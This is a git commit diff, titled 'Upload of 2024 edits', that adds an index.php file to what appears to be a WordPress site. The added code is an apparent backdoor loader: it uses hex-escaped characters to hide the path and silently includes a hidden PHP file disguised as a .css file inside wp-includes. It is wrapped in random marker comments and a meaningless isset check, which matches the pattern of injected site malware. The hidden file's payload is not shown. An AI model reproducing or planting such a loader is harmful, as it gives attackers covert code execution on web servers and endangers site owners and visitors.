9b8188d487d10b7af2a14669aefacbda3e2cb29a
nicolebaster-design <105657761+nicolebaster-design@users.noreply.github.com>
2025-05-15 12:16:01 -0400

    Upload of 2024 edits

---
+++ index.php
@@ -0,0 +1,9 @@
+<?php
+/*5aea5*/
+
+$rms2 = "/home/.sites/307/site7130698/web/wp\x2dinc\x6cudes/sodium_compat/src/.804e5467.css"; if (!isset($rms2)) {htmlentities ($rms2);} else { @include_once /* 172 */ ($rms2); }
+
+/*5aea5*/
+
+
+echo @file_get_contents('index.html.bak.bak');
